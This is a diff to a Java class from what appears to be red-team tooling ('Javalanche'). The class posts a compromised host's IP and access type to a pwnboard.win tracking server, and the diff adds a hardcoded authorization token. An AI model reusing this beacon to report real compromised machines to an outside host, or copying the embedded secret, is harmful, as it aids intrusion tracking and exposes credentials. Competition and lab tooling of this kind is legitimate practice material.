@@ -15,18 +15,20 @@ public class pwnBoardRequest implements Runnable {
     private URL pwnboardUrl = null;
     
     private String pwnboardData;
+    private String pwnboardToken;
 
     public pwnBoardRequest(String IPAddress, String accessType) {
         try{
-            this.pwnboardUri = new URI("https://pwnboard.win/generic");
+            this.pwnboardUri = new URI("https://pwnboard.win/pwn");
             this.pwnboardUrl = this.pwnboardUri.toURL();
         } catch (URISyntaxException e){
             e.printStackTrace();
         } catch (MalformedURLException e){
             e.printStackTrace();
         }
-        
+
         pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\"}"; 
+        pwnboardToken = "OyZgkrgMpM0_5U6zIt-auxBr87AdcRMNUPJOak8JqlQ";
     }
 
     @Override
@@ -35,6 +37,9 @@ public class pwnBoardRequest implements Runnable {
             // Connect to pwnboard
             HttpURLConnection pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
             pwnboardConnection.setDoOutput(true);
+            pwnboardConnection.setRequestMethod("POST");
+            pwnboardConnection.setRequestProperty("Content-Type", "application/json");
+            pwnboardConnection.setRequestProperty("Authorization", pwnboardToken);
             pwnboardConnection.connect();
 
             // Send api request
